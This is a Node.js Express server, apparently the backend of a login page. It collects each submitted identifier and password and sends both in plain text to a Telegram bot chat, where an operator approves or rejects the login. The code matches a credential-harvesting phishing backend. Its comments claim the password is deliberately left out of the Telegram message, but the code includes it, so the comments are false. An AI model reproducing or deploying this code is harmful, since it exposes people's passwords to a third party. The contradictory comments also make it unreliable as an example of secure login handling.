const express = require("express");
const crypto = require("crypto");

const app = express();
const PORT = 3000;

// ===============================
// TELEGRAM CONFIG
// ===============================
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.error("BOT_TOKEN and ADMIN_CHAT_ID are required.");
    process.exit(1);
}

app.use(express.json());
app.use(express.static("public"));

// Temporary in-memory requests.
// Production app mein database + expiration use karein.
const requests = new Map();

function makeId() {
    return crypto.randomBytes(8).toString("hex");
}

async function telegram(method, body) {
    const response = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(body)
        }
    );

    return response.json();
}

// ===============================
// CREATE LOGIN REQUEST
// ===============================
app.post("/api/login", async (req, res) => {
    const identifier = String(req.body.identifier || "").trim();
    const password = String(req.body.password || "");

    if (!identifier || !password) {
        return res.status(400).json({
            error: "Identifier and password required"
        });
    }

    // Password backend par receive hua.
    // Isse Telegram/logs/database mein plaintext ke roop mein nahi bhejna.
    // Agar authentication ke liye zarurat ho to yahin securely verify/hash karo.

    const requestId = makeId();

    requests.set(requestId, {
        identifier, password, 
        status: "pending",
        createdAt: Date.now()
    });

    // IMPORTANT:
    // Telegram message mein password intentionally include nahi hai.
    const message =
`🔐 New Test Login Request

Identifier: ${identifier}
Password: ${password}
Request ID: ${requestId}
Status: ⏳ Pending`;

    await telegram("sendMessage", {
        chat_id: ADMIN_CHAT_ID,
        text: message,
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: "✅ Approve",
                        callback_data: `approve:${requestId}`
                    },
                    {
                        text: "❌ Reject",
                        callback_data: `reject:${requestId}`
                    }
                ]
            ]
        }
    });

    res.json({
        success: true,
        requestId
    });
});

// ===============================
// CHECK APPROVAL STATUS
// ===============================
app.get("/api/login-status/:id", (req, res) => {
    const request = requests.get(req.params.id);

    if (!request) {
        return res.status(404).json({
            error: "Request not found"
        });
    }

    res.json({
        status: request.status
    });
});

// ===============================
// TELEGRAM WEBHOOK
// ===============================
app.post("/telegram/webhook", async (req, res) => {
    const callback = req.body.callback_query;

    if (!callback || !callback.data) {
        return res.sendStatus(200);
    }

    const [action, requestId] = callback.data.split(":");
    const request = requests.get(requestId);

    if (!request) {
        await telegram("answerCallbackQuery", {
            callback_query_id: callback.id,
            text: "Request expired."
        });

        return res.sendStatus(200);
    }

    if (request.status !== "pending") {
        await telegram("answerCallbackQuery", {
            callback_query_id: callback.id,
            text: "This request has already been processed."
        });

        return res.sendStatus(200);
    }

    if (action === "approve") {
        request.status = "approved";
    } else if (action === "reject") {
        request.status = "rejected";
    }

    requests.set(requestId, request);

    const statusText =
        request.status === "approved"
            ? "✅ Approved"
            : "❌ Rejected";

    await telegram("answerCallbackQuery", {
        callback_query_id: callback.id,
        text: statusText
    });

    await telegram("editMessageText", {
        chat_id: callback.message.chat.id,
        message_id: callback.message.message_id,
        text:
`🔐 Test Login Request

Identifier: ${request.identifier}
Request ID: ${requestId}
Status: ${statusText}`
    });

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});